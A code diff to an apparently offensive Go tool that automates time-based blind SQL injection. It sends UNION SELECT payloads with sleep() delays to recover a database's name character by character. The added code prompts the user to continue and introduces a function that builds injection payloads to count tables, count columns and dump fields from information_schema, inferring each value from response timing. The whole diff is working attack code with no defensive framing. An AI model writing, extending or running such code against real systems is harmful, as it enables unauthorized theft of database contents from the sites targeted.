@@ -6,8 +6,10 @@ import (
 	"log"
 	"net/http"
 	"net/url"
+	"os"
 	"regexp"
 	"strconv"
+	"strings"
 	"time"
 )
 
@@ -17,10 +19,14 @@ var Green = "\033[32m"
 var Yellow = "\033[33m"
 var EndColor = "\033[0m"
 var verbosePtr *bool
-
 var Strings = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"
 
-// var Strings = "klmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"
+type Database struct {
+	TargetValue  string
+	DatabaseName string
+	TableName    string
+	Field        string
+}
 
 func makeRequest(payload string) {
 
@@ -50,8 +56,51 @@ func makeRequest(payload string) {
 
 func handle() {
 	databaseName := exploitDatabase("' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #")
-	fmt.Printf("%v\n[✔] Database's name found: %v\n", Green, databaseName)
+	fmt.Printf("%v\n[✔] Database's name found: %v %v\n", Green, databaseName, EndColor)
 
+	var choice string
+	fmt.Print("\nDo you want to continue to exploit tables? [Y/n]: ")
+	fmt.Scanf("%v", &choice)
+
+	if strings.ToLower(choice) == "y" {
+		database := Database{"tables", databaseName, "", ""}
+		tablesNumber := getValueFields(database)
+		fmt.Println(tablesNumber)
+	} else {
+		fmt.Println("Exiting...")
+		os.Exit(0)
+	}
+
+}
+
+func getValueFields(db Database) int {
+
+	var payload string
+
+	for i := 0; i <= 99; i++ {
+
+		switch db.TargetValue {
+		case "tables":
+			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '%s')='%d', sleep(0.3), NULL), 4, 5, 6; #'", db.DatabaseName, i)
+		case "columns":
+			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '%s' and table_name = '%s')='%d', sleep(0.3), NULL), 4, 5, 6; #'", db.DatabaseName, db.TableName, i)
+
+		case "dump":
+			payload = fmt.Sprintf("' or 1=1 union select 1, 2, if((SELECT COUNT(%s) FROM {table_name})='%d' , sleep(0.3), NULL), 4, 5, 6; #'", db.Field, i)
+		}
+
+		start := time.Now()
+		makeRequest(payload)
+		final := time.Now()
+
+		elapsed := final.Sub(start)
+
+		if elapsed >= 300*time.Millisecond {
+			return i
+		}
+	}
+
+	return 0
 }
 
 func exploitDatabase(payload string) string {
@@ -60,7 +109,6 @@ func exploitDatabase(payload string) string {
 	total_strings_verified := 0
 
 	for {
-
 		for _, current_value := range Strings {
 			payloadFormatted := regexp.MustCompile(`\{index\}`).ReplaceAllString(payload, strconv.Itoa(item))
 			payloadFormatted = regexp.MustCompile(`\{value\}`).ReplaceAllString(payloadFormatted, string(current_value))
@@ -88,12 +136,8 @@ func exploitDatabase(payload string) string {
 			if total_strings_verified >= 90 {
 				return name
 			}
-
 		}
-
 	}
-	return ""
-
 }
 
 func main() {
